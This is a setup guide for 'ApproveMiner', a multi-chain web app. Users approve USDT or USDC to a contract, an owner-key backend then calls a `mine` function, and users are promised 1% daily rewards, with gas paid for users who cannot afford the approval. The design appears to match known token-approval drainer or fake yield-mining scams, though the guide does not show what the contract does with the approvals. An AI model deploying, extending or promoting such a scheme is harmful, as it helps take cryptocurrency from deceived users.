# ApproveMiner Setup Guide

## Environment Variables

Create a `.env.local` file in the root directory with the following variables:

```env
# Owner's private key (the wallet that will call the mine function)
OWNER_PRIVATE_KEY=0x...your_private_key_here
```

**Note:** The contract addresses are automatically selected from `constents.tsx` based on the chain ID. No need to set contract address in env.

## How It Works

### 1. User Flow (Frontend)
1. User clicks "Start Mining" button
2. Selects asset (USDT or USDC) and enters amount
3. Approves the token for the contract
4. After approval, backend automatically calls the mine function

### 2. Backend Flow (API)
- `/api/check-gas` endpoint checks if user has enough gas
  - Estimates gas needed for approval transaction
  - If user lacks gas, automatically sends native tokens (ETH/BNB/MATIC)
  - Alerts admin via Telegram if admin wallet is low on gas
- `/api/mine` endpoint receives user data
- Uses owner's private key to call the `mine` function on the contract
- Records user's mining session with automatic decimal detection

### 3. Rewards Page (Me Tab)
- Displays all user's mining records
- Shows pending rewards (calculated in real-time)
- Allows users to claim rewards
- Rewards accumulate at 1% daily rate

## Key Features

✅ Automatic decimal detection from token contract  
✅ Real-time reward calculation  
✅ Multi-token support (USDT & USDC)  
✅ Multi-chain support (BSC, Ethereum, Polygon)  
✅ User-friendly claim interface  
✅ **Automatic gas fee handling** - Sends gas to users who can't afford approval  
✅ **Admin alerts** - Notifies via Telegram when admin wallet is low on gas  

## Contract Functions Used

- `mine(user, token, amount)` - Owner-only, starts mining
- `getAllUserMiningData(user)` - Gets all mining records
- `getUserRewardsWithDecimals(user, token)` - Gets rewards with decimals
- `claimRewards(token)` - User claims rewards

## Important Notes

⚠️ Keep your `OWNER_PRIVATE_KEY` secure and never commit it to version control  
⚠️ Make sure the contract has sufficient token balance to pay rewards  
⚠️ **Keep the admin wallet funded with native tokens (ETH/BNB/MATIC)** for gas fees  
⚠️ You'll receive Telegram alerts when admin wallet balance drops below 0.01  
⚠️ Update the SPENDER addresses in `constents.tsx` for each chain with your deployed contract addresses  

## Testing

1. Install dependencies:
```bash
npm install
```

2. Run development server:
```bash
npm run dev
```

3. Test the flow:
   - Connect wallet
   - Start mining with test amount
   - Check Me tab for rewards
   - Claim rewards after some time
